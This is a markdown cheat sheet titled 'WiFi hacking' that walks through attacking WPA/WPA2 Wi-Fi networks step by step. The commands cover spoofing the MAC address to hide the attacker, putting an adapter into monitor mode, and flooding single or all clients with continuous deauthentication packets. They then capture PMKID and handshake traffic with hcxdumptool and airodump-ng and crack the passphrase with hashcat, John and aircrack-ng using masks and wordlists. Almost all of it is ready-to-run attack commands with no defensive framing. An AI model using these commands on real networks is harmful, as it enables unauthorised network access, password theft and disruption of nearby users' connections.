# WiFi hacking

## install REaltek drivers 

This is a typical wifi SOC within ALFA devices.


```bash
sudo apt install realtek-rtl88xxau-dkms
```

## Hide your Mac

```bash

sudo ip link set dev $interface down

sudo macchanger --mac=aa:bb:cc:dd:ee:ff $interface

sudo ip link set dev $interface up

```


## Put Wireless Interface in Monitor Mode


1. check for available interfaces

`airmon-ng check`

2. kill interfering processes

`airmon-ng check kill`

3. If interface is on `wlan0`, set it to monitoring mode

`airmon-ng start wlan0`

On success you get something like 

```
PHY	Interface	Driver		Chipset

phy0	wlan0		88XXau		Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
		(monitor mode enabled)

```

## Scanning for Networks


```bash

sudo airodump-ng --band abg $interface


#You can combine these to monitor multiple bands. For example:

#--band abg: Monitor all 2.4 GHz and 5 GHz networks.
#--band bg: Monitor only 2.4 GHz networks (both 802.11b and 802.11g).
#--band a: Monitor only 5 GHz networks.


```




This will display a list of all available Wi-Fi networks, along with various details about them:

```text
BSSID: The MAC address of the access point.
PWR: Signal level reported by the card.
Beacons: Number of announcements packets sent by the AP.
#Data: Number of captured data packets (includes data and QoS data).
CH: Channel on which the AP is operating.
ENC: Encryption algorithm used (WEP, WPA, WPA2, etc.).
ESSID: The name of the Wi-Fi network.
```



## De-auth attack

### single client

```bash

# you have to be monitoring specific BSSID on specific channel

sudo airodump-ng --bssid $AP_mac  -c $channel $interface


sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface


# where -0 0 is continuous deauth mode

```

### multi clients

`sudo aireplay-ng -0 0 -a $AP_mac  $interface`


## Attack 1


The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) is:

hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=1 -F


The command to get general information about the target (ESSID, CHANNEL, MAC_AP. IN/OFF RANGE) and to check that it is within range:

hcxdumptool -i INTERFACE_NAME --rcascan=active --rds=5 -F


The full command to create a BPF to the target (attack ccce1edc3bee) would be as follows:

hcxdumptool --bpfc="wlan addr1 ccce1edc3bee or wlan addr2 ccce1edc3bee or wlan addr3 ccce1edc3bee or type mgt subtype probereq" > attack.bpf


Since we have now made the BPF, we can start the attack using all the information mentioned above depending on the invasive levewl:

sudo hcxdumptool -i wlan0 -c 11a --bpf=attack.bpf -w testap.pcapng

or (do not respond to CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --bpf=attack.bpf -w testap.pcapng

or (do not DISASSOCIATE CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --disable_disassociation --bpf=attack.bpf -w testap.pcapng

or (do not respond to CLIENTs and do not DISASSOCIATE CLIENTs)
sudo hcxdumptool -i wlan0 --rds=3 -c 11a --proberesponsetx=0 --disable_disassociation --bpf=attack.bpf -w testap.pcapng


Convert the traffic to hash format 22000

hcxpcapngtool -o testap.hc22000 testap.pcapng

Run Hashcat on the list of words obtained from WPA traffic


```bash
hashcat -m 22000 filtered_hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
-a 3: Specifies a mask attack.
?d: Represents a digit (0–9).
```

OR use John

hcxpcapngtool --john testap.john testap.pcapng
crunch 8 12 -t @@@@@@@@ > mylist.txt
john -w mylist.txt --format=wpapsk-opencl testap.john


## Attack 2

Old attack but is also proven.

```bash
sudo apt update && sudo apt install aircrack-ng

iwconfig

```

Enable monitoring mode

```bash
airmon-ng check kill  
airmon-ng start wlan0  
iw dev
```

Find target

```bash
sudo airodump-ng --band abg $interface
```

`airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon`

Deauth some client connected to the target BSSID to get the handshake faster:

`aireplay-ng -0 5 -a [BSSID] -c [CLIENT MAC] wlan0mon`

-0 5: 5 deauth packets

Or (careful) deauth all:

`aireplay-ng -0 0 -a [BSSID] wlan0mon`

WAit for handshake captured message max 1-2 minutes

Crack the passphrase with aircrack:

`aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap`

Or use hashcat for this 

```bash
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 /path/to/wordlist -w 3
hashcat -m 22000 -a 3 -w 3 hash.hc22000 ?d?d?d?d?d?d?d?d
```

Or make own dictionary

`crunch 8 12 -t @@@@@@@@ > mylist.txt`